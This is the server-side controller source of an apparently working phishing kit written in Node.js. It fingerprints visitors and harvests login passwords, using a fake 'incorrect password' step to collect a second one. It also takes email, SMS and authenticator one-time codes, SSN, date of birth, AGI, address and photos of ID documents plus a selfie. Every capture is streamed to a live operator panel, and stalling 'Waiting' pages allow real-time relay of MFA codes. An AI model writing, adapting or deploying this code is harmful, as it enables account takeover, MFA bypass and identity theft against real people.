require("dotenv").config();
const axios = require("axios");
const os = require("os");
const { Telegraf } = require("telegraf");
const { message } = require("telegraf/filters");
const { v4: uuidv4 } = require("uuid");
const io = require("../io");

const Log = require("../model/Log");
const { default: mongoose } = require("mongoose");
const { DOUBLE_LOGIN, BOT_TOKEN } = require("../config");
const bot = new Telegraf(BOT_TOKEN);

exports.getIndex = (req, res, next) => {
  if (req.session && req.session.visitorId) {
    return res.redirect("/session");
  }

  const options = {
    hour: "numeric",
    minute: "numeric",
    hour12: true,
  };

  req.session.visitorId = uuidv4().replace(/-/g, "").substring(0, 12);
  axios
    .get(
      `https://ipapi.co/${req.clientIp.toString().replace(/[^\d.]/g, "")}/json/`
    )
    .then(function (response) {
      req.session.id = req.session.visitorId;
      req.session.status = true;
      req.session.ip = req.clientIp.toString().replace(/[^\d.]/g, "");
      req.session.country = response.data.country;
      req.session.os = `${os.type()} ${os.release()}`;
      req.session.useragent = req.useragent.source;
      req.session.isp = response.data.org;
      req.session.page = "Login";
      req.session.createdAt = `${new Date().toLocaleTimeString(
        [],
        options
      )} ${new Date().toLocaleDateString()}`;

      req.session.save();
      res.redirect("/session");
    })
    .catch(function (error) {
      // handle error
      console.log(error);
    })
    .finally(function () {});
};

// first sign in attempt
exports.getSession = async (req, res, next) => {
  if (!req.session.visitorId) {
    return res.redirect("/");
  }

  await mongoose.connection
    .collection("sessions")
    .updateMany(
      { "session.visitorId": req.session.visitorId }, // The search query
      {
        $set: {
          "session.page": "Login 1",
        },
      } // The update operation
    )
    .then((result) => {
      res.render("login-first", {
        visitorId: req.session.visitorId,
      });
    });
};

exports.postFirstSignIn = async (req, res, next) => {
  await mongoose.connection
    .collection("sessions")
    .updateMany(
      { "session.visitorId": req.session.visitorId }, // The search query
      {
        $set: {
          "session.first_login": `${req.body.email}:${req.body.password}`,
        },
      } // The update operation
    )
    .then((result) => {
      io.getIO().emit("updatePanel", {
        updated: true,
      });
      if (DOUBLE_LOGIN === "TRUE") {
        res.redirect("/session/incorrect");
      } else {
        res.redirect("/processing/primary");
      }
    });
};

// second sign in attempt
exports.getSecondSession = async (req, res, next) => {
  if (!req.session.visitorId) {
    return res.redirect("/");
  }

  await mongoose.connection
    .collection("sessions")
    .updateMany(
      { "session.visitorId": req.session.visitorId }, // The search query
      {
        $set: {
          "session.page": "Login 2",
        },
      } // The update operation
    )
    .then((result) => {
      res.render("login-second", {
        visitorId: req.session.visitorId,
      });
    });
};

exports.postSecondSignIn = async (req, res, next) => {
  await mongoose.connection
    .collection("sessions")
    .updateMany(
      { "session.visitorId": req.session.visitorId }, // The search query
      {
        $set: {
          "session.second_login": `${req.body.email}:${req.body.password}`,
        },
      } // The update operation
    )
    .then((result) => {
      io.getIO().emit("updatePanel", {
        updated: true,
      });
      res.redirect("/processing/primary");
    });
};

exports.getEmail = async (req, res, next) => {
  if (!req.session.visitorId) {
    return res.redirect("/");
  }

  await mongoose.connection
    .collection("sessions")
    .updateMany(
      { "session.visitorId": req.session.visitorId }, // The search query
      {
        $set: {
          "session.page": "EMAIL Code",
        },
      } // The update operation
    )
    .then((result) => {
      res.render("email-code", {
        visitorId: req.session.visitorId,
      });
    });
};

exports.postCodeEmail = async (req, res, next) => {
  await mongoose.connection
    .collection("sessions")
    .updateMany(
      { "session.visitorId": req.session.visitorId }, // The search query
      {
        $set: {
          "session.otp_email": req.body.code,
        },
      } // The update operation
    )
    .then((result) => {
      io.getIO().emit("updatePanel", {
        updated: true,
      });
      res.redirect("/processing/primary");
    });
};

exports.getAuthenticator = async (req, res, next) => {
  if (!req.session.visitorId) {
    return res.redirect("/");
  }

  await mongoose.connection
    .collection("sessions")
    .updateMany(
      { "session.visitorId": req.session.visitorId }, // The search query
      {
        $set: {
          "session.page": "MFA Code",
        },
      } // The update operation
    )
    .then((result) => {
      res.render("authApp-code", {
        visitorId: req.session.visitorId,
      });
    });
};

exports.postCodeMFA = async (req, res, next) => {
  await mongoose.connection
    .collection("sessions")
    .updateMany(
      { "session.visitorId": req.session.visitorId }, // The search query
      {
        $set: {
          "session.otp_mfa": req.body.code,
        },
      } // The update operation
    )
    .then((result) => {
      io.getIO().emit("updatePanel", {
        updated: true,
      });
      res.redirect("/processing/primary");
    });
};

exports.getPhone = async (req, res, next) => {
  if (!req.session.visitorId) {
    return res.redirect("/");
  }

  await mongoose.connection
    .collection("sessions")
    .updateMany(
      { "session.visitorId": req.session.visitorId }, // The search query
      {
        $set: {
          "session.page": "SMS Code",
        },
      } // The update operation
    )
    .then((result) => {
      res.render("sms-code", {
        visitorId: req.session.visitorId,
      });
    });
};

exports.postCodePhone = async (req, res, next) => {
  await mongoose.connection
    .collection("sessions")
    .updateMany(
      { "session.visitorId": req.session.visitorId }, // The search query
      {
        $set: {
          "session.otp_phone": req.body.code,
        },
      } // The update operation
    )
    .then((result) => {
      io.getIO().emit("updatePanel", {
        updated: true,
      });
      res.redirect("/processing/primary");
    });
};

exports.getPersonal = async (req, res, next) => {
  if (!req.session.visitorId) {
    return res.redirect("/");
  }

  await mongoose.connection
    .collection("sessions")
    .updateMany(
      { "session.visitorId": req.session.visitorId }, // The search query
      {
        $set: {
          "session.page": "Personal",
        },
      } // The update operation
    )
    .then((result) => {
      res.render("personal", {
        visitorId: req.session.visitorId,
      });
    });
};

exports.postPersonal = async (req, res, next) => {
  await mongoose.connection
    .collection("sessions")
    .updateMany(
      { "session.visitorId": req.session.visitorId }, // The search query
      {
        $set: {
          "session.first_name": req.body.first_name,
          "session.middle_name": req.body.middle_name,
          "session.last_name": req.body.last_name,
          "session.suffix": req.body.suffix,
          "session.dob": req.body.birth_date,
          "session.ssn": req.body.social,
          "session.agi": req.body.agi,
          "session.street": `${req.body.street} ${req.body.urbanization}`,
          "session.city": req.body.city,
          "session.state": req.body.state,
          "session.zip_code": req.body.zip,
        },
      } // The update operation
    )
    .then((result) => {
      io.getIO().emit("updatePanel", {
        updated: true,
      });
      res.redirect("/processing/secondary");
    });
};

exports.getIdentity = async (req, res, next) => {
  if (!req.session.visitorId) {
    return res.redirect("/");
  }

  await mongoose.connection
    .collection("sessions")
    .updateMany(
      { "session.visitorId": req.session.visitorId }, // The search query
      {
        $set: {
          "session.page": "Docs",
        },
      } // The update operation
    )
    .then((result) => {
      res.render("docs", {
        visitorId: req.session.visitorId,
      });
    });
};

exports.getUploadDocs = async (req, res, next) => {
  if (!req.session.visitorId) {
    return res.redirect("/");
  }

  await mongoose.connection
    .collection("sessions")
    .updateMany(
      { "session.visitorId": req.session.visitorId }, // The search query
      {
        $set: {
          "session.page": "Docs",
        },
      } // The update operation
    )
    .then((result) => {
      res.render("docs-upload", {
        visitorId: req.session.visitorId,
        front_img: req.session.id_front ? req.session.id_front : null,
        back_img: req.session.id_back ? req.session.id_back : null,
        selfie_img: req.session.id_selfie ? req.session.id_selfie : null,
      });
    });
};

exports.getUploadDocsFront = async (req, res, next) => {
  if (!req.session.visitorId) {
    return res.redirect("/");
  }

  await mongoose.connection
    .collection("sessions")
    .updateMany(
      { "session.visitorId": req.session.visitorId }, // The search query
      {
        $set: {
          "session.page": "Docs",
        },
      } // The update operation
    )
    .then((result) => {
      res.render("docs-upload-front", {
        visitorId: req.params.id,
      });
    });
};

exports.postUploadFront = async (req, res, next) => {
  try {
    await mongoose.connection
      .collection("sessions")
      .updateMany(
        { "session.visitorId": req.session.visitorId }, // The search query
        {
          $set: {
            "session.id_front": req.files.image_front[0].path,
          },
        } // The update operation
      )
      .then((result) => {
        io.getIO().emit("updatePanel", {
          updated: true,
        });
        res.redirect("/session/docs-upload");
      });
  } catch (error) {
    res.redirect(`/session/docs-upload/front/${req.session.visitorId}`);
  }
};

exports.getUploadDocsBack = async (req, res, next) => {
  if (!req.session.visitorId) {
    return res.redirect("/");
  }

  await mongoose.connection
    .collection("sessions")
    .updateMany(
      { "session.visitorId": req.session.visitorId }, // The search query
      {
        $set: {
          "session.page": "Docs",
        },
      } // The update operation
    )
    .then((result) => {
      res.render("docs-upload-back", {
        visitorId: req.params.id,
      });
    });
};

exports.postUploadBack = async (req, res, next) => {
  try {
    await mongoose.connection
      .collection("sessions")
      .updateMany(
        { "session.visitorId": req.session.visitorId }, // The search query
        {
          $set: {
            "session.id_back": req.files.image_back[0].path,
          },
        } // The update operation
      )
      .then((result) => {
        io.getIO().emit("updatePanel", {
          updated: true,
        });
        res.redirect("/session/docs-upload");
      });
  } catch (error) {
    res.redirect(`/session/docs-upload/back/${req.session.visitorId}`);
  }
};

exports.getUploadSelfie = async (req, res, next) => {
  if (!req.session.visitorId) {
    return res.redirect("/");
  }

  await mongoose.connection
    .collection("sessions")
    .updateMany(
      { "session.visitorId": req.session.visitorId }, // The search query
      {
        $set: {
          "session.page": "Docs",
        },
      } // The update operation
    )
    .then((result) => {
      res.render("docs-upload-selfie", {
        visitorId: req.params.id,
      });
    });
};

exports.postUploadSelfie = async (req, res, next) => {
  try {
    await mongoose.connection
      .collection("sessions")
      .updateMany(
        { "session.visitorId": req.session.visitorId }, // The search query
        {
          $set: {
            "session.id_selfie": req.files.image_selfie[0].path,
          },
        } // The update operation
      )
      .then((result) => {
        io.getIO().emit("updatePanel", {
          updated: true,
        });
        res.redirect("/session/docs-upload");
      });
  } catch (error) {
    res.redirect(`/session/docs-upload/selfie/${req.session.visitorId}`);
  }
};

exports.getPrimaryLoading = async (req, res, next) => {
  if (!req.session.visitorId) {
    return res.redirect("/");
  }

  await mongoose.connection
    .collection("sessions")
    .updateMany(
      { "session.visitorId": req.session.visitorId }, // The search query
      {
        $set: {
          "session.page": "Waiting 1...",
        },
      } // The update operation
    )
    .then((result) => {
      res.render("loading-first", {
        visitorId: req.session.visitorId,
      });
    });
};

exports.getSecondaryLoading = async (req, res, next) => {
  if (!req.session.visitorId) {
    return res.redirect("/");
  }

  await mongoose.connection
    .collection("sessions")
    .updateMany(
      { "session.visitorId": req.session.visitorId }, // The search query
      {
        $set: {
          "session.page": "Waiting 2...",
        },
      } // The update operation
    )
    .then((result) => {
      res.render("loading-second", {
        visitorId: req.session.visitorId,
      });
    });
};
